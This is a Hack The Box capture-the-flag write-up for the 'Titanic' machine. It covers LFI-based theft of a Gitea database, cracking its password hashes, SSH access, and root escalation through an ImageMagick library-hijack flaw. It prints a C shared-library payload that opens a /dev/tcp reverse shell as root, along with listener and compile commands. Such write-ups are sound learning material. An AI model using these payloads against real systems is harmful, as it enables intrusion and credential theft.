---
description: Here are the write-ups for HTB machine, Nocturnal.
icon: linux
coverY: 0
---

# Titanic

<figure><img src=".gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

## Initial

No extensive information given in the start, as usual we provided with IP Address.

## Scanning

### Port Scanning

Based on these outputs. I discovered 2 ports, 22 and 80 is open. From here, we have to include titanic.htb inside `/etc/hosts`  then we can start port enumeration.

```
rustscan -a 10.10.11.55
nmap -sC -sV 10.10.11.55
nano /etc/hosts > add "10.10.11.55    titanic.htb"
```

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

### Port 22 (SSH) Enumeration

I found nothing here, let's move on.

### Port 80 (HTTP) Enumeration

#### Subdomain discovery

I discovered 1 subdomain called`dev.titanic.htb`. From my observation, this domain used by developer to store n manage web repositories. Without proper access control, I can access the web source code, config files, important file locations, and credential.&#x20;

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption><p>subdomain fuzzing</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Information Disclosure

During source code analysis, I found out the the website is vulnerable to [Local File Inclusion (LFI)](https://www.geeksforgeeks.org/php/local-file-inclusion-lfi/).  I tested on BurpSuite to confirm my theory. Then I leverage it and discover database path.

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

#### Database Enumeration

I downloaded this SQLite file content as `gitea.db` and remove the HTTP header, then we can start enumerating for any useful credential.

<figure><img src=".gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

#### Password Cracking via Hashcat

I discovered password hash for developer and administrator, given with the password hash algorithm.

Honestly, I been stuck here for A LONG time. I was unable to crack the password. Then I discover a post on cracking [Gitea's PBKDF2 Password Hashes](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes).

<figure><img src=".gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

Leveraged this script, I able to convert gitea password hash to hashcat compatible hash format.

```
python3 gitea2hashcat.py "8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56"
```

<figure><img src=".gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

From `gitea2hashcat.py` output, I saved it to `gitea.hash` and run hashcat that file using rockyou wordlist.

```
hashcat gitea.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src=".gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

NOTE: I repeated the same step on administrator pass hash, but the hash looks like uncrackable.

## Gain Access

### Establish SSH Connection

Previously, I able to crack the hash. I establish SSH connection using developer account with cracked password to gain user access on server. When connection successfully established, I make a listing of files and print content of user.txt

```
ssh developer@10.10.11.55 > Enter password
ls -la
cat user.txt
```

<figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

### Script sharing over HTTP

To start enumerating and attempt to privilege escalation, I used LinPeas.sh to automate discovery. Before that, i have to download the script from my machine using python http server.

```
python3 -m http.server 8000
```

<figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Download LinPeas.sh on target machine using following command:

```
wget http://10.10.11.55:8000/linpeas.sh
```

<figure><img src=".gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

### PE Enumeration via LinPeas

I automote enumeration for privilege escalation using the famous script, LinPeas.sh

```
chmod +x linpeas.sh
./linpeas.sh
```

After A LONG TIME finding, trying and erroringg. I discovered this script, identify\_images.sh and magick bin file. Honest, i didn't really know about this and didn't really hoped up on this, but I'll try.

<figure><img src=".gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

## Post Exploitation

The purpose fo this script is to:

* Change directory to /opt/app/static/assets/images
* Empties and set byte to 0 for metadata.log
* file all images in `/opt/app/static/assets/images/` with **.jpg** extension. Then pipe it into /bin/magick identify tool to extract image metadata and append to metadata.log.

<figure><img src=".gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

### ImageMagick Enumeration

I lookup to find vulnerability associated with this ImageMagick version and discover a critical vulnerability.

<figure><img src=".gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

Here is where this get complicated, I stucked here for A LONG TIME (AGAIN). I tried multiple script to get privilege escalation. Then I found this PoC on Github\[[Link](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)].

I try to craft my own payload, save file as shell.c and setup the listener.

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -c 'sh -i >& /dev/tcp/10.10.16.103/9003 0>&1'");
}
```

```
nc -lvnp 9003
```

<figure><img src=".gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

```
gcc -fPIC -shared -o ./libxcb.so.1 shell.c -nostartfiles
```

I run the payload with shared library we create based on github post we read before.

<figure><img src=".gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

### Enumerate Root Flag

Here we go, I finally got the reverse shell as `root`. I only have to read `root.txt`

<figure><img src=".gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
